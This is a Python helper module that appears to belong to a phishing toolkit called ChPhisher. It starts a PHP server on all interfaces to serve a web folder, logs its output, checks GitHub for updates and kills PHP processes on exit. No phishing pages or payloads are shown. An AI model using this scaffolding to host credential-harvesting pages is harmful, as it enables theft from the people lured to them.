from __future__ import annotations

import os
import subprocess
import sys
import time
import hashlib
import json

import psutil
import requests
from colorama import Fore

from modules.config import VERSION_INFO, IS_WINDOWS, SERVER_CONFIG_FILE
from modules.ui import print_failed, print_warning, print_input


def clear_screen(): os.system('cls') if IS_WINDOWS else os.system('clear')

def create_time_hash():
    try:
        str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
        result = hashlib.md5(str2hash.encode()).hexdigest()
        return result
    except Exception as e:
        print_failed(f"ERROR: {e}")

def capture_command_output(command: list, output_path):
    try:
        subprocess.Popen(command, stderr=output_path, stdout=output_path, creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0)
    except Exception as exp:
        print_failed(f'ERROR: {exp}')

def generate_log_name():
    try:
        directory_path = 'log'
        os.makedirs(directory_path, exist_ok=True)

        return directory_path + os.sep + 'PHP-' + create_time_hash() + '.log'
    except Exception as e:
        print_failed(f"ERROR: {e}")
        return None

def load_config(path: str) -> dict:
    default = {
        'host': '0.0.0.0',
        'port': 3000
    }
    try:
        with open(path, 'r') as fr:
            return json.loads(fr.read())
    except Exception as e:
        print_warning(f'Something went wrong in reading the config file. Using default server config ...')
        return default

def check_update():
    response = requests.get("https://raw.githubusercontent.com/Ch4120N/ChPhisher/main/data/version.json").json()

    if VERSION_INFO < response.get('lastVersion'):
        print_warning(f'New update available ... {Fore.LIGHTRED_EX}v{VERSION_INFO}{Fore.LIGHTCYAN_EX} -> {Fore.LIGHTGREEN_EX}v{response.get("lastVersion")}')

def local_server(output_file: str):
    server_config = load_config(SERVER_CONFIG_FILE)
    command = ['php', '-S', f"{server_config.get('host')}:{server_config.get('port')}", '-t', 'www']
    with open(output_file, 'w') as fw:
        capture_command_output(command, fw)
    
    return server_config

def kill_local_server(process_name: str, kill_all: bool = True):
    killed = 0
    target_name = process_name.lower()

    for proc in psutil.process_iter(['name', 'pid']):
        try:
            proc_name = proc.info['name']
            if proc_name is None:
                continue

            # Normalize: lower case and remove extension (if any) for comparison
            base_name = proc_name.lower()
            if '.' in base_name:
                base_name = base_name.split('.')[0]   # remove extension

            if base_name == target_name:
                proc.kill()          # or proc.terminate() for graceful shutdown
                killed += 1
                if not kill_all:
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, IndexError):
            # Process may have vanished or we don't have permission – skip it
            continue

    return killed

def wait_input():
    try:
        print_input(f'Press [{Fore.LIGHTRED_EX}ENTER{Fore.WHITE}] or {Fore.YELLOW}CTRL + C{Fore.WHITE} to stop the server ...')
        input()
    except KeyboardInterrupt:
        kill_local_server('php')
        sys.exit(0)
    kill_local_server('php')
    sys.exit(0)